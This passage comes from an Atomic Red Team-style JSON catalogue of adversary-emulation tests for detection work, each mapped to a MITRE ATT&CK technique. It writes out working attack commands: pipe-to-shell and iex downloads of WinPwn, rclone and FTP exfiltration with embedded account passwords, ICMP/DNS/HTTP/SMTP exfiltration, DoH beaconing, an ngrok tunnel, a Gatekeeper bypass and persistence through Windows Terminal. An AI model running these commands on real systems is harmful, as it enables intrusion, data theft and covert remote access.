			"command": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Change login shell",
		"auto_generated_guid": "c7ac59cb-13cc-4622-81dc-6d2fee9bfac7",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "chsh - change login shell, must be installed\n",
				"prereq_command": "if [ -f /usr/bin/chsh ]; then echo \"exit 0\"; else echo \"exit 1\"; exit 1; fi\n",
				"get_prereq_command": "echo \"Automated installer not implemented yet, please install chsh manually\"\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n",
			"cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && rmuser -y art || userdel art\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Environment variable scripts",
		"auto_generated_guid": "bdaebd56-368b-4970-a523-f905ff4a8a51",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n",
			"cleanup_command": "unset ART\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Detecting pipe-to-shell",
		"auto_generated_guid": "fca246a8-a585-4f28-a2df-6495973976a1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_url": {
				"description": "url of remote payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Check if curl is installed on the machine.\n",
				"prereq_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
				"get_prereq_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n",
			"cleanup_command": "rm /tmp/art.txt\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Current kernel information enumeration",
		"auto_generated_guid": "3a53734a-9e26-4f4b-ad15-059e767f5f14",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "uname -srm\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Shell Creation using awk command",
		"auto_generated_guid": "ee72b37d-b8f5-46a5-a9e7-0ff50035ffd5",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "awk 'BEGIN {system(\"/bin/sh &\")}'",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
		"auto_generated_guid": "8529ee44-279a-4a19-80bf-b846a40dda58",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"rclone_path": {
				"description": "Directory of rclone.exe",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"
			},
			"rclone_config_path": {
				"description": "Path to rclone's config file (default should be fine)",
				"type": "path",
				"default": "$env:appdata"
			},
			"dir_to_copy": {
				"description": "Directory to copy",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002"
			},
			"mega_user_account": {
				"description": "Mega user account",
				"type": "string",
				"default": "atomictesting@outlook.com"
			},
			"mega_user_password": {
				"description": "Mega user password",
				"type": "string",
				"default": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
			},
			"remote_share": {
				"description": "Remote Mega share",
				"type": "string",
				"default": "T1567002"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "rclone must exist at (#{rclone_path})\n",
				"prereq_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\\" -force\n"
			}
		],
		"executor": {
			"command": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n",
			"cleanup_command": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1567.002",
		"phases": ["exfiltration"]
	},
	{
		"name": "Gatekeeper Bypass",
		"auto_generated_guid": "fb3d46c6-9480-4803-8d7d-ce676e1f1a9b",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"app_path": {
				"description": "Path to app to be used",
				"type": "path",
				"default": "myapp.app"
			}
		},
		"executor": {
			"command": "sudo xattr -d com.apple.quarantine #{app_path}\n",
			"elevation_required": true,
			"name": "sh"
		},
		"attack_technique": "T1553.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "DNS over HTTPS Large Query Volume",
		"auto_generated_guid": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"doh_server": {
				"description": "Default DoH resolver",
				"type": "string",
				"default": "https://8.8.8.8/resolve"
			},
			"query_type": {
				"description": "DNS query type",
				"type": "string",
				"default": "TXT"
			},
			"subdomain": {
				"description": "Subdomain prepended to the domain name",
				"type": "string",
				"default": "atomicredteam"
			},
			"query_volume": {
				"description": "Number of DNS queries to send",
				"type": "integer",
				"default": 1000
			},
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "127.0.0.1.xip.io"
			}
		},
		"executor": {
			"command": "for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest \"#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}\" -UseBasicParsing).Content }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1572",
		"phases": ["command-and-control"]
	},
	{
		"name": "DNS over HTTPS Regular Beaconing",
		"auto_generated_guid": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"doh_server": {
				"description": "Default DoH resolver",
				"type": "string",
				"default": "https://8.8.8.8/resolve"
			},
			"runtime": {
				"description": "Time in minutes to run the simulation",
				"type": "integer",
				"default": 30
			},
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "127.0.0.1.xip.io"
			},
			"subdomain": {
				"description": "Subdomain prepended to the domain name",
				"type": "string",
				"default": "atomicredteam"
			},
			"query_type": {
				"description": "DNS query type",
				"type": "string",
				"default": "TXT"
			},
			"c2_interval": {
				"description": "Seconds between C2 requests to the command and control server",
				"type": "integer",
				"default": 30
			},
			"c2_jitter": {
				"description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
				"type": "integer",
				"default": 20
			}
		},
		"executor": {
			"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1572",
		"phases": ["command-and-control"]
	},
	{
		"name": "DNS over HTTPS Long Domain Query",
		"auto_generated_guid": "748a73d5-cea4-4f34-84d8-839da5baa99c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"doh_server": {
				"description": "Default DoH resolver",
				"type": "string",
				"default": "https://8.8.8.8/resolve"
			},
			"query_type": {
				"description": "DNS query type",
				"type": "string",
				"default": "TXT"
			},
			"subdomain": {
				"description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
				"type": "string",
				"default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"
			},
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "127.0.0.1.xip.io"
			}
		},
		"executor": {
			"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1572",
		"phases": ["command-and-control"]
	},
	{
		"name": "run ngrok",
		"auto_generated_guid": "4cdc9fc7-53fb-4894-9f0c-64836943ea60",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"api_token": {
				"description": "ngrok API",
				"type": "string",
				"default": "N/A"
			},
			"port_num": {
				"description": "port number for tunnel",
				"type": "integer",
				"default": 3389
			},
			"download": {
				"description": "link to download ngrok",
				"type": "string",
				"default": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Download ngrok\n",
				"prereq_command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n"
			}
		],
		"executor": {
			"command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
			"cleanup_command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1572",
		"phases": ["command-and-control"]
	},
	{
		"name": "Find and Display Internet Explorer Browser Version",
		"auto_generated_guid": "68981660-6670-47ee-a5fa-7e74806420a4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1518",
		"phases": ["discovery"]
	},
	{
		"name": "Applications Installed",
		"auto_generated_guid": "c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1518",
		"phases": ["discovery"]
	},
	{
		"name": "Find and Display Safari Browser Version",
		"auto_generated_guid": "103d6533-fd2a-4d08-976a-4a598565280f",
		"supported_platforms": ["macos"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n"
		},
		"attack_technique": "T1518",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - Dotnetsearch",
		"auto_generated_guid": "7e79a1b6-519e-433c-ad55-3ff293667101",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1518",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - DotNet",
		"auto_generated_guid": "10ba02d0-ab76-4f80-940d-451633f24c5b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1518",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - powerSQL",
		"auto_generated_guid": "0bb64470-582a-4155-bde2-d6003a95ed34",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1518",
		"phases": ["discovery"]
	},
	{
		"name": "Persistence by modifying Windows Terminal profile",
		"auto_generated_guid": "ec5d76ef-82fe-48da-b931-bdb25a62bc65",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"calculator": {
				"description": "Test program used to imitate a maliciously called program.",
				"type": "string",
				"default": "calculator.exe"
			},
			"settings_json_def": {
				"description": "Default file for Windows Terminal to replace the default profile with a backdoor to call another program.",
				"type": "path",
				"default": "~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"
			},
			"settings_json_tmp": {
				"description": "Temp file for Windows Terminal.",
				"type": "path",
				"default": "~\\AppData\\Local\\Temp\\settings.json"
			},
			"wt_exe": {
				"description": "Windows Terminal executable.",
				"type": "path",
				"default": "~\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\wt.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Windows Terminal must be installed\n",
				"prereq_command": "if (Test-Path #{wt_exe}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "$(rm ~\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\LocalState\\StoreEdgeFD\\installed.db -ErrorAction Ignore; Write-Output \"\"; $?) -and $(winget install --id=Microsoft.WindowsTerminal)\n"
			}
		],
		"executor": {
			"command": "mv #{settings_json_def} #{settings_json_tmp}\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"#{settings_json_def}\"\nwt.exe\n",
			"cleanup_command": "mv -Force #{settings_json_tmp} #{settings_json_def}\ntaskkill /F /IM \"#{calculator}\" > $null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.015",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add macOS LoginItem using Applescript",
		"auto_generated_guid": "716e756a-607b-41f3-8204-b214baf37c1d",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"scriptfile": {
				"description": "path to Applescript source to add Safari LoginItem.",
				"type": "string",
				"default": "PathToAtomicsFolder/T1547.015/src/add_login_item.osa"
			},
			"cleanup_script": {
				"description": "path to Applescript source to delete Safari LoginItem.",
				"type": "string",
				"default": "PathToAtomicsFolder/T1547.015/src/remove_login_item.osa"
			}
		},
		"executor": {
			"command": "osascript #{scriptfile}\n",
			"cleanup_command": "osascript #{cleanup_script}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1547.015",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - HTTP",
		"auto_generated_guid": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"steps": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - ICMP",
		"auto_generated_guid": "dd4b4421-2e25-4593-90ae-7021947ad12e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "Path to file to be exfiltrated.",
				"type": "path",
				"default": "C:\\Windows\\System32\\notepad.exe"
			},
			"ip_address": {
				"description": "Destination IP address where the data should be sent.",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - DNS",
		"auto_generated_guid": "c403b5a4-b5fc-49f2-b181-d1c80d27db45",
		"supported_platforms": ["linux"],
		"executor": {
			"steps": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n\n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - HTTP",
		"auto_generated_guid": "6aa58451-1121-4490-a8e9-1dada3f1c68c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n",
			"name": "powershell",
			"elevation_required": false
		},
		"input_arguments": {
			"input_file": {
				"description": "Path to file to exfiltrate",
				"type": "path",
				"default": "C:\\Windows\\System32\\notepad.exe"
			},
			"ip_address": {
				"description": "Destination IP address where the data should be sent",
				"type": "string",
				"default": "http://127.0.0.1"
			}
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - SMTP",
		"auto_generated_guid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"input_arguments": {
			"input_file": {
				"description": "Path to file to exfiltrate",
				"type": "path",
				"default": "C:\\Windows\\System32\\notepad.exe"
			},
			"sender": {
				"description": "The email address of the sender",
				"type": "string",
				"default": "test@corp.com"
			},
			"receiver": {
				"description": "The email address of the receiver",
				"type": "string",
				"default": "test@corp.com"
			},
			"smtp_server": {
				"description": "SMTP server to use for email transportation",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "MAZE FTP Upload",
		"auto_generated_guid": "57799bc2-ad1e-4130-a793-fb0c385130ba",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ftp_server": {
				"description": "FTP Server address",
				"type": "string",
				"default": "127.0.0.1"
			},
			"username": {
				"description": "Username for FTP server login",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Password for FTP server login",
				"type": "string",
				"default": null
			}
		},
		"executor": {
			"command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
			"cleanup_command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
		"auto_generated_guid": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ftp_server": {
				"description": "Your own ftp server",
				"type": "string",
				"default": "ftp.dlptest.com"
			},
			"ftp_pass": {
				"description": "Your FTP user's password",
				"type": "string",
				"default": "rNrKYTX9g7z3RgJRmxWuGHbeu"
			},
			"ftp_user": {
				"description": "Your FTP username",
				"type": "string",
				"default": "dlpuser"
			},
			"ftp_port": {
				"description": "Your FTP's port",
				"type": "integer",
				"default": 21
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if the exfil package exists\n",
				"prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
				"get_prereq_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n"
			},
			{
				"description": "Check if rclone zip exists",
				"prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n"
			}
		],
		"executor": {
			"command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Python3 http.server",
		"auto_generated_guid": "3ea1f938-f80a-4305-9aa8-431bc4867313",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n"
		},
		"attack_technique": "T1048.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Utilize Clipboard to store or execute commands from",
		"auto_generated_guid": "0cd14633-58d4-4422-9ede-daa2c9474ae7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n",
			"cleanup_command": "del %temp%\\T1115.txt >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1115",
		"phases": ["collection"]
	},
	{
		"name": "Execute Commands from Clipboard using PowerShell",
		"auto_generated_guid": "d6dc21af-bec9-4152-be86-326b6babd416",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "echo Get-Process | clip\nGet-Clipboard | iex\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1115",
		"phases": ["collection"]
	},
	{
		"name": "Execute commands from clipboard",
		"auto_generated_guid": "1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "echo ifconfig | pbcopy\n$(pbpaste)",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1115",
		"phases": ["collection"]
	},
	{
		"name": "Collect Clipboard Data via VBA",
		"auto_generated_guid": "9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ms_product": {
				"description": "Maldoc application Word",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n",
			"cleanup_command": "Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1115",
		"phases": ["collection"]
	},
	{
		"name": "Add or copy content to clipboard with xClip",
		"auto_generated_guid": "ee363e53-b083-4230-aff3-f8d955f2d5bb",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1115",
		"phases": ["collection"]
	},
	{
		"name": "AWS - Create a new IAM user",
		"auto_generated_guid": "8d1c2368-b503-40c9-9057-8e42f21c58ad",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"username": {
				"description": "Username of the IAM user to create in AWS",
				"type": "string",
				"default": "atomicredteam"
			}
		},
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "aws iam create-user --user-name #{username}\n",
			"cleanup_command": "aws iam delete-user --user-name #{username}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1136.003",
		"phases": ["persistence"]
	},
	{
		"name": "Azure AD - Create a new user",
		"auto_generated_guid": "e62d23ef-3153-4837-8625-fa4a3829134d",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Display name of the new user to be created in Azure AD",
				"type": "string",
				"default": "atomicredteam"
			},
			"userprincipalname": {
				"description": "User principal name (UPN) for the new Azure user being created format email address",
				"type": "string",
				"default": "atomicredteam@yourdomain.com"
			},
			"password": {
				"description": "Password for the new Azure AD user being created",
				"type": "string",
